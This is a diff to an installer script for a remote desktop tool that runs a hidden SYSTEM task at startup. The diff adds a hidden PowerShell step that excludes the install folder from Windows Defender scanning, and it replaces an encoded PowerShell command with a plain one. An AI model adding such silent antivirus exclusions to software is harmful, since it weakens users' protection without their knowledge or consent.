@@ -47,6 +47,7 @@ Name: "{group}\Uninstall Easy Remote Desktop"; Filename: "{uninstallexe}"
 Name: "{commondesktop}\Easy Remote Desktop"; Filename: "{app}\RemoteDesktopP2P.exe"; WorkingDir: "{app}"
 
 [Run]
+Filename: "powershell.exe"; Parameters: "-NoProfile -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionPath '{app}' -ErrorAction SilentlyContinue"""; Flags: runhidden
 ; Remove old firewall rules if they exist
 Filename: "netsh.exe"; Parameters: "advfirewall firewall delete rule name=""EasyRemoteDesktopAgent"""; Flags: runhidden
 Filename: "netsh.exe"; Parameters: "advfirewall firewall delete rule name=""EasyRemoteDesktopService"""; Flags: runhidden
@@ -59,7 +60,7 @@ Filename: "netsh.exe"; Parameters: "advfirewall firewall add rule name=""EasyRem
 Filename: "cmd.exe"; Parameters: "/c schtasks.exe /create /tn ""EasyRemoteDesktopAgent"" /tr ""\""{app}\RemoteDesktopService.exe\"""" /sc onstart /ru ""NT AUTHORITY\SYSTEM"" /rl highest /f > ""{app}\task_creation.log"" 2>&1"; Flags: runhidden
 
 ; Configure task to allow starting and running on battery power (disallow stopping on battery)
-Filename: "powershell.exe"; Parameters: "-NoProfile -ExecutionPolicy Bypass -EncodedCommand JAB0ACAAPQAgAEcAZQB0AC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAC0AVABhAHMAawBOAGEAbQBlACAAJwBFAGEAcwB5AFIAZQBtAG8AdABlAEQAZQBzAGsAdABvAHAAQQBnAGUAbgB0ACcAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAOwAgAGkAZgAgACgAJAB0ACkAIAB7ACAAJAB0AC4AUwBlAHQAdABpAG4AZwBzAC4ARABpAHMAYQBsAGwAbwB3AFMAdABhAHIAdABJAGYATwBuAEIAYQB0AHQAZQByAGkAZQBzACAAPQAgACQAZgBhAGwAcwBlADsAIAAkAHQALgBTAGUAdAB0AGkAbgBnAHMALgBTAHQAbwBwAEkAZgBHAG8AaQBuAGcATwBuAEIAYQB0AHQAZQByAGkAZQBzACAAPQAgACQAZgBhAGwAcwBlADsAIAAkAHQALgBTAGUAdAB0AGkAbgBnAHMALgBFAHgAZQBjAHUAdABpAG8AbgBUAGkAbQBlAEwAaQBtAGkAdAAgAD0AIAAnAFAAVAAwAFMAJwA7ACAAUwBlAHQALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrACAALQBJAG4AcAB1AHQATwBiAGoAZQBjAHQAIAAkAHQAIAB9AA=="; Flags: runhidden
+Filename: "powershell.exe"; Parameters: "-NoProfile -ExecutionPolicy Bypass -Command ""$t = Get-ScheduledTask -TaskName 'EasyRemoteDesktopAgent' -ErrorAction SilentlyContinue; if ($t) {{ $t.Settings.DisallowStartIfOnBatteries = $false; $t.Settings.StopIfGoingOnBatteries = $false; $t.Settings.ExecutionTimeLimit = 'PT0S'; Set-ScheduledTask -InputObject $t }"""; Flags: runhidden
 
 ; Start background service
 Filename: "cmd.exe"; Parameters: "/c schtasks.exe /run /tn ""EasyRemoteDesktopAgent"" > ""{app}\task_run.log"" 2>&1"; Flags: runhidden
@@ -71,6 +72,7 @@ Filename: "{app}\RemoteDesktopP2P.exe"; WorkingDir: "{app}"; Description: "{cm:R
 
 
 [UninstallRun]
+Filename: "powershell.exe"; Parameters: "-NoProfile -ExecutionPolicy Bypass -Command ""Remove-MpPreference -ExclusionPath '{app}' -ErrorAction SilentlyContinue"""; Flags: runhidden
 ; Stop existing scheduled task
 Filename: "schtasks.exe"; Parameters: "/end /tn ""EasyRemoteDesktopAgent"""; Flags: runhidden waituntilterminated
 ; Delete scheduled task
